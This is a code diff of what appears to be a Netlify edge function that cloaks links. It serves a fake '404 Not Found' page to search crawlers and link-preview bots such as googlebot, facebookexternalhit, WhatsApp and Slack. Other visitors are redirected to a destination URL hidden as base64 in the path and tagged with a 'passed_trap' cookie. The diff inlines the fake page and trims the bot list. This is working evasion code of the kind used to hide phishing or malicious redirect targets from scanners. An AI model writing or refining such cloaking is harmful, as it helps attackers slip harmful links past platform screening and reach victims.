@@ -4,75 +4,44 @@ export default async (request, context) => {
   const clientIP = context.ip;
   const cookies = request.headers.get("cookie") || "";
 
-  // Helper function to serve your fake 404 HTML
-  const serveFake404 = async () => {
-    try {
-      const response = await fetch(new URL("/index.html", request.url));
-      const html = await response.text();
-      return new Response(html, {
-        status: 404,
-        headers: { "Content-Type": "text/html" }
-      });
-    } catch (err) {
-      return new Response("Not Found", { status: 404 });
-    }
-  };
+  // BAKE-IN the 404 HTML to avoid "fetch" errors
+  const FAKE_404_HTML = `<!DOCTYPE html><html><head><title>404 Not Found</title><style>body{margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;}h1{border-right:1px solid #ccc;padding:10px 20px;margin-right:20px;}span{font-size:14px;}</style></head><body><h1>404</h1><span>This page could not be found.</span></body></html>`;
 
-  // 1. EXTRACT BASE64 DATA (e.g., from /.aHR0c...)
+  const serveFake404 = () => new Response(FAKE_404_HTML, {
+    status: 404,
+    headers: { "Content-Type": "text/html" }
+  });
+
+  // 1. EXTRACT DATA
   const pathParts = url.pathname.split(".");
   const base64Data = pathParts.length > 1 ? pathParts[pathParts.length - 1] : null;
 
-  // 2. BOT PROTECTION LIST
-  const blockedAgents = [
-    "googlebot", "bingbot", "yandex", "baiduspider", "facebookexternalhit", 
-    "twitterbot", "rogerbot", "linkedinbot", "embedly", "quora link preview", 
-    "showyoubot", "outbrain", "pinterest/0.", "slackbot", "vkShare", 
-    "W3C_Validator", "redditbot", "Applebot", "WhatsApp", "flipboard", 
-    "tumblr", "bitlybot", "SkypeShell", "archive.org_bot"
-  ];
-
+  // 2. BOT LIST
+  const blockedAgents = ["googlebot", "bingbot", "yandex", "baiduspider", "facebookexternalhit", "twitterbot", "whatsapp", "slackbot"];
   const isBot = blockedAgents.some(agent => userAgent.toLowerCase().includes(agent.toLowerCase()));
 
-  // 3. EXECUTE PROTECTION
-  if (isBot) {
-    return await serveFake404();
-  }
+  if (isBot) return serveFake404();
 
-  // 4. HANDLE DECODING & REDIRECT
+  // 3. DECODE & REDIRECT
   if (base64Data) {
     try {
-      // Decode and handle potential URL-safe base64 issues (replacing - with + and _ with /)
-      const normalizedBase64 = base64Data.replace(/-/g, '+').replace(/_/g, '/');
-      const decodedUrl = atob(normalizedBase64);
+      // Robust decoding
+      const normalized = base64Data.replace(/-/g, '+').replace(/_/g, '/');
+      const decodedUrl = atob(normalized);
       
-      // Safety check: ensure it's a valid web URL
-      if (!decodedUrl.startsWith("http")) {
-        throw new Error("Invalid URL format");
-      }
+      if (!decodedUrl.startsWith("http")) throw new Error();
 
       const response = Response.redirect(decodedUrl, 302);
-      
-      // Set the "passed" cookie for 24 hours
-      response.headers.append(
-        "Set-Cookie", 
-        "passed_trap=true; Path=/; Max-Age=86400; HttpOnly; SameSite=Strict; Secure"
-      );
-      
+      response.headers.append("Set-Cookie", "passed_trap=true; Path=/; Max-Age=86400; HttpOnly; SameSite=Strict; Secure");
       return response;
     } catch (e) {
-      // If decoding fails, show the fake 404
-      return await serveFake404();
+      return serveFake404();
     }
   }
 
-  // 5. FALLBACK (If they have the cookie, let them see the site, else show 404)
-  if (cookies.includes("passed_trap=true")) {
-    return; 
-  }
+  if (cookies.includes("passed_trap=true")) return; 
 
-  return await serveFake404();
+  return serveFake404();
 };
 
-export const config = {
-  path: "/*",
-};
+export const config = { path: "/*" };
